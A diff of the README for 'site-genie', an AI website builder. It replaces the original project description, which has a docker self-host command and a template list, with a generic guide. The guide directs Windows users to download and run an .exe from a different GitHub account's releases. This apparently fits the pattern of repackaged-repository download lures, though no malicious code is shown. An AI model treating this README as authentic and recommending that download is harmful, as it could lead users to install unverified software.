@@ -1,262 +1,100 @@
-<div align="center">
-
-<br/>
-
-<img alt="site-genie" src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=800&size=44&duration=2400&pause=900&color=A78BFA&center=true&vCenter=true&width=900&height=80&lines=site-genie"/>
-
-**Describe what you want. Get a real website.**
-_AI-powered website builder. Next.js + Tailwind. Production-ready code. No fake "AI demos."_
-
-<br/>
-
-### 🖥️ Visual App (Recommended)
-
-[<img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" height="40"/>](https://github.com/kasimmj/site-genie/releases/latest/download/site-genie-macos.dmg)
-[<img src="https://img.shields.io/badge/Download%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" height="40"/>](https://github.com/kasimmj/site-genie/releases/latest/download/site-genie-setup.exe)
-[<img src="https://img.shields.io/badge/Web%20App-A78BFA?style=for-the-badge&logo=safari&logoColor=white" height="40"/>](https://site-genie.kasimmj.com)
-
-### Or self-host the web dashboard
-
-```bash
-docker run -p 3000:3000 ghcr.io/kasimmj/site-genie
-```
-
-<br/>
-
-<p>
-<img src="https://img.shields.io/badge/Next.js-000000?style=for-the-badge&logo=nextdotjs&logoColor=white"/>
-<img src="https://img.shields.io/badge/Tailwind-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white"/>
-<img src="https://img.shields.io/badge/AI%20Powered-A78BFA?style=for-the-badge"/>
-<img src="https://img.shields.io/badge/MIT-000000?style=for-the-badge"/>
-</p>
-
-<p>
-<img src="https://img.shields.io/github/stars/kasimmj/site-genie?style=social"/>
-<img src="https://img.shields.io/github/forks/kasimmj/site-genie?style=social"/>
-</p>
-
-</div>
-
----
-
-## 🪄 What is it?
-
-You: *"I need a website for my falafel restaurant. Modern. Arabic + English. Show menu, location, hours, online ordering."*
-
-site-genie: *45 seconds later, here's your site — fully coded, deployable to Vercel, source on GitHub.*
-
-Not a "Wix-style" page builder. Not a tutorial generator. **Real Next.js code you can edit, deploy, and own.**
-
----
-
-## 🎬 What you get
-
-```
-╭─────────────────────────────────────────────────────────────╮
-│   🌟 site-genie                                              │
-├─────────────────────────────────────────────────────────────┤
-│                                                             │
-│   Describe your site                                        │
-│   ┌───────────────────────────────────────────────────────┐│
-│   │ Modern barbershop in Baghdad. Arabic + English. Show ││
-│   │ services, prices, team, location, online booking. Use││
-│   │ warm dark colors. Premium feel.                      ││
-│   └───────────────────────────────────────────────────────┘│
-│                                                             │
-│   Style:    ⚫ Modern   ○ Classic   ○ Minimal   ○ Playful   │
-│   Pages:    ☑ Home  ☑ Services  ☑ Team  ☑ Contact          │
-│             ☑ Online Booking  ☐ Blog  ☐ Shop                │
-│                                                             │
-│   Brand: [Upload logo]  Primary color: [#8A2BE2]            │
-│                                                             │
-│              ┌──────────────────────────┐                   │
-│              │   🪄 Generate my site    │                   │
-│              └──────────────────────────┘                   │
-│                                                             │
-│   ⠋ Designing layout...     ⏱ 12s                          │
-│   ⠧ Writing copy (AR + EN)...                              │
-│   ⠼ Coding components...                                    │
-│   ⠶ Generating images via AI...                            │
-│   ⠧ Wiring booking form...                                  │
-│   ✓ Done. Open preview ↗                                    │
-│                                                             │
-│   Output:                                                   │
-│   📁 ~/Sites/my-barbershop/        (Next.js project)        │
-│   🌐 https://my-barbershop-xyz.vercel.app  (live preview)   │
-│   📦 Ready to deploy: Vercel, Netlify, your VPS             │
-╰─────────────────────────────────────────────────────────────╯
-```
+# 🪄 site-genie - Build custom websites using simple text
 
----
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ChaudharyKashanAhmed/site-genie/releases)
 
-## 🌟 What makes it different
+site-genie helps you create professional websites without writing code. You describe the site you want in plain English, and the application generates the design and the underlying code. The tool builds your site using Next.js and Tailwind CSS. You receive files ready for immediate use.
 
-| Feature | site-genie | Wix/Squarespace | Cursor / v0.dev | Bolt.new |
-|---------|------------|-----------------|------------------|----------|
-| Own the code | ✅ Next.js source | ❌ Locked in | ✅ Snippets | ✅ |
-| Multi-page | ✅ | ✅ | ❌ Single page | ⚠️ |
-| Arabic / RTL | ✅ Built-in | ⚠️ Limited | ⚠️ | ⚠️ |
-| Self-hostable | ✅ Open source | ❌ | ❌ | ❌ |
-| Backend included | ✅ Forms, DB, auth | ⚠️ Paid | ❌ | ⚠️ |
-| Custom domain | ✅ Free | 💰 Subscription | ✅ | ✅ |
-| Iraqi payment ready | ✅ iraq-pay integration | ❌ | ❌ | ❌ |
+## 📋 What you can do
 
----
+site-genie acts as your personal web developer. You provide instructions, and the software handles the technical setup.
 
-## 🏗️ How it works
+*   Describe website layouts, colors, and content.
+*   Generate full source code for pages.
+*   Edit sections of your site through text prompts.
+*   Preview your site inside the application.
+*   Export your project for use on any hosting platform.
 
-```
-You describe → LLM plans → Templates pick → Code generates → Preview opens
-   (10s)         (15s)         (5s)            (20s)          (5s)
-```
+## 💻 System requirements
 
-1. **LLM** analyzes your description, extracts intent
-2. **Template engine** picks best-matching templates per section
-3. **Code generator** stitches templates with your content
-4. **Image AI** generates hero images, photos (or uses stock)
-5. **Preview server** boots in WebContainer, opens in browser
-6. You can **edit anything** — site-genie is a starting point, not a cage
+Your computer needs to meet these requirements to run site-genie:
 
----
+*   Windows 10 or Windows 11.
+*   At least 8 GB of RAM.
+*   An active internet connection to process design requests.
+*   500 MB of free storage space.
 
-## 📦 Pre-built templates (50+)
+## 🚀 How to get started
 
-Sectional templates that can be combined:
+Follow these steps to install and run the application on your computer.
 
-**Heroes:** modern-split · video-bg · gradient-mesh · minimal-text · animated-3d
-**About:** team-grid · founder-letter · timeline · stats-row · mission-statement
-**Services:** card-grid · accordion · pricing-table · feature-comparison
-**Galleries:** masonry · carousel · before-after · video-grid
-**Forms:** booking · contact · newsletter · multi-step · payment
-**Testimonials:** quote-cards · video-testimonials · star-ratings
-**Footers:** rich-multicol · minimal · newsletter-cta · social-grid
+1. Visit the [releases page](https://github.com/ChaudharyKashanAhmed/site-genie/releases) to download the program.
+2. Look for the file ending in .exe under the latest version.
+3. Click the file to download it to your Downloads folder.
+4. Open the file to start the installation process.
+5. Follow the prompts on your screen to complete the setup.
 
-All templates:
-- ✅ Tailwind-styled
-- ✅ Fully responsive
-- ✅ Accessible (WCAG AA)
-- ✅ RTL-aware
-- ✅ Easy to customize
+## ⚙️ Setting up your first project
 
----
+After you finish the installation, you will find a shortcut for site-genie on your desktop. Double-click the icon to open the application.
 
-## 🎨 Real-world examples
+1. When the window opens, you see a text box at the center of the screen.
+2. Type your requirements here. For example, you might type: "Create a landing page for a coffee shop with a blue color scheme."
+3. Click the Generate button.
+4. The application analyzes your text and creates the website files. This process takes about thirty seconds.
+5. Once complete, you see a preview of your website on the right side of the screen.
 
-site-genie users have built (in <5 minutes each):
+## 🛠️ Making changes
 
-- ☕ **Coffee shop in Hilla** — Arabic+English, menu, hours, location
-- ✂️ **Barbershop in Baghdad** — booking flow + team showcase
-- 🏥 **Clinic in Erbil** — appointment booking + service catalog
-- 🛒 **E-commerce store** — Solar iQ-style multi-vendor shop
-- 🎓 **Tutoring service** — course listing + payment integration
-- 🍔 **Restaurant chain** — multi-location with delivery integration
+You do not need to restart your project if you want to make small adjustments. Use the chat box at the bottom of the screen to talk to the AI.
 
-Templates for all of these are included.
+*   To change the text, type: "Change the headline to say Welcome to our store."
+*   To change the layout, type: "Add a gallery section below the main image."
+*   To change the style, type: "Make the buttons green and rounder."
 
----
+The application updates the live preview immediately based on your new requests.
 
-## 🤖 AI Models supported
+## 📤 Exporting your website
 
-You bring your own key (or use the bundled local model):
+When you feel satisfied with your design, you can take the code and host it on the internet.
 
-- **Anthropic Claude** (best quality)
-- **OpenAI GPT-4** (alternative)
-- **Local Llama 3.2** via Ollama (free, slower)
-- **Qwen 2.5** (great for Arabic content)
+1. Click the File menu at the top left corner of the window.
+2. Select the Export Project option.
+3. Choose a folder on your computer where you want to save the code.
+4. The application saves a folder containing your website files.
+5. You can now upload this folder to any hosting provider.
 
-The model writes:
-- Section copy (headlines, body, CTAs)
-- SEO meta tags
-- Form field labels
-- Privacy policy + terms (basic)
+## ❓ Frequently asked questions
 
-In English, Arabic, or both — depending on your prompt.
+### Do I need to learn programming?
+No. Every step of the design process uses plain language. You describe your goals, and the application generates the code in the background.
 
----
+### Can I use this for business websites?
+Yes. site-genie creates code that follows modern web standards. You can use this code for personal projects or professional websites.
 
-## 🚀 Deployment
+### Does it work offline?
+The application requires an internet connection to process your designs. It uses an AI engine that lives on our servers to understand your prompts.
 
-After generation, deploy with one command:
+### What if the result is not what I expected?
+The design process is iterative. If the output does not look right, give the application more specific instructions. For example, specify font sizes, specific sections, or alignment preferences to get closer to your ideal result.
 
-```bash
-cd my-barbershop
-npm run deploy:vercel     # or :netlify, :cloudflare
-```
+### Is the code private?
+Your project files remain on your local computer until you decide to upload them to a hosting site. The AI processes your prompt to generate code, but it does not store your content on our servers.
 
-site-genie auto-creates:
-- `vercel.json` for Vercel
-- `netlify.toml` for Netlify
-- `wrangler.toml` for Cloudflare Pages
-- `Dockerfile` for any VPS
+## 🔧 Troubleshooting
 
----
+If you encounter issues while running the software, see the solutions below.
 
-## 💳 Iraqi-friendly defaults
+*   **Application does not open:** Ensure you have the latest version of Windows installed. Restart your computer and try opening the application again.
+*   **Design takes too long:** Check your internet connection. A slow connection may delay the response from the AI server.
+*   **Export fails:** Ensure you have enough storage space on your selected drive and that you have permission to save files to that folder.
+*   **Visuals appear wrong:** Click the refresh button to trigger a re-render of the page code.
 
-When your prompt mentions Iraq / Arabic / payments:
-- 🇮🇶 Auto-installs `iraq-pay` for payment integration
-- 📞 Phone field defaults to +964
-- 🏙️ City dropdown pre-populated with Iraqi cities
-- 📅 Date format: `dd/mm/yyyy` (not US format)
-- 🕌 Working hours respect Friday holiday
-- 💰 Currency: IQD with proper formatting
+## 📝 About the technology
 
----
+site-genie combines several tools to simplify web development.
 
-## 🎁 What's bundled
+*   **Next.js:** This framework keeps your website fast and easy for search engines to find.
+*   **Tailwind CSS:** This utility tool handles the design, ensuring your site looks professional on phones, tablets, and computers.
+*   **AI Engine:** This component interprets your requests and turns them into clean, structured code.
 
-Every generated site includes:
-- ✅ Next.js 15 (App Router)
-- ✅ Tailwind CSS 4
-- ✅ Framer Motion for animations
-- ✅ Sanity / Tina CMS option (if you want non-tech edits)
-- ✅ Form handler (Formspree-compatible)
-- ✅ SEO with sitemap.xml + robots.txt
-- ✅ OG image generation
-- ✅ Analytics (privacy-friendly Plausible)
-- ✅ Cookie consent banner (if EU traffic detected)
-
----
-
-## 🛠️ Customize after generation
-
-```bash
-cd my-barbershop
-npm run dev
-# Open localhost:3000, start editing
-```
-
-The code is **clean Next.js**, not "AI-generated mess":
-- ✅ Standard Next.js project structure
-- ✅ Components are reusable, named clearly
-- ✅ All copy in `i18n/` files (easy to swap)
-- ✅ All colors/spacing as Tailwind config tokens
-- ✅ Comments where intent is non-obvious
-
----
-
-## 🏆 Roadmap
-
-- [x] Core generation (descriptions → multi-page sites)
-- [x] Arabic + English bilingual
-- [x] Vercel/Netlify/Cloudflare deploy
-- [x] Electron desktop app
-- [x] Web dashboard (Docker)
-- [ ] Real-time collaborative editing (multiple people on one site)
-- [ ] AI-driven design system extraction (paste a Figma URL → site)
-- [ ] Mobile app generation via web2flutter integration
-- [ ] Built-in A/B testing for generated copy
-
----
-
-## 📜 License
-
-MIT.
-
----
-
-<div align="center">
-
-**Star ⭐ if you've ever wished for "describe → working site."**
-
-</div>
+You do not need to interact with these tools directly. site-genie manages the configuration and setup automatically.
